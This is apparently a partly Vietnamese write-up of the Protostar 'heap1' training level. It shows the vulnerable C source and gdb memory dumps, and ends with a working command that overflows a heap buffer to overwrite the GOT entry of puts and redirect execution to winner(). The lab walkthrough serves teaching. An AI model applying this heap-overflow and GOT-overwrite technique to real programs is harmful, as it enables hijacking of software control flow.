# HEAP ONE

## About

This level takes a look at code flow hijacking in data overwrite cases.

This level is at /opt/protostar/bin/heap1

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

## Solutions

`HEAP ONE` cho chúng ta thấy ngoài việc thay đổi luồng thực thi, trong một số trường hợp đặc biệt việc khai báo cấu trúc các biến cho ta khả năng ghi đè dẫn tới chiếm được quyền điều khiển luồng thực thi. Thử thách hoàn thành khi chúng ta in được dòng chữ `"and we have a winner @ "`.

Trong chương trình này, chúng ta thấy rằng hai `struct internet` `i1`, `i2` đã được cấp phát. Mỗi struct chứa một con trỏ `name` được cấp phát riêng. Điều này có nghĩa là `struct internet` được cấp phát trên heap sẽ chứa một con trỏ đến một phần khác của bộ nhớ trên heap có chứa bộ đệm char.

Bộ nhớ Heap được cấp phát liên tục nên Heap được bố cục như sau:

```
[i1 structure][i1's name buffer][i2 structure][i2's name buffer]
```

Do buffer overflow từ cuộc gọi `strcpy` đầu tiên, chúng ta có thể ghi đè con trỏ `name` của i2 bằng một vị trí mà chúng ta muốn cuộc gọi `strcpy` thứ hai ghi vào. Với điều này, chúng ta có thể ghi dữ liệu tùy ý vào bất kỳ vị trí nào trong bộ nhớ mà chúng tôi muốn.

```
$./heap1 AAAA BBBB

(gdb) x/50x  0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
...
```

Vấn đề bây giờ là ghi vào đâu? Chắc các bạn vẫn còn nhớ `FORMAT FOUR`, ý tưởng của tôi ở đây là ghi đè địa chỉ `GOT` của hàm `puts` bằng địa chỉ của hàm `winner` để thay vì gọi hàm `puts` in `"and that's a wrap folks!"` chúng ta sẽ nhảy đến hàm `winner` và thoát mà không có `Segmentation fault`.

Địa chỉ `winner`.

```
(gdb) print &winner
$1 = (void (*)(void)) 0x8048494 <winner>
```

Địa chỉ `GOT` của `puts`.

```
...
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave
0x08048567 <main+174>:  ret
End of assembler dump.
(gdb) x/2i 0x80483cc
0x80483cc <puts@plt>:   jmp    DWORD PTR ds:0x8049774
0x80483d2 <puts@plt+6>: push   0x30
(gdb)
```

Tiến hành khai thác.

```
root@protostar:/opt/protostar/bin# ./heap1 $(python -c "print 'A' * 20 + '\x74\x97\x04\x08'") $(python -
c "print '\x94\x84\x04\x08'")
and we have a winner @ 1649082615
```

## Documents

<https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf>

<https://sourceware.org/glibc/wiki/MallocInternals>



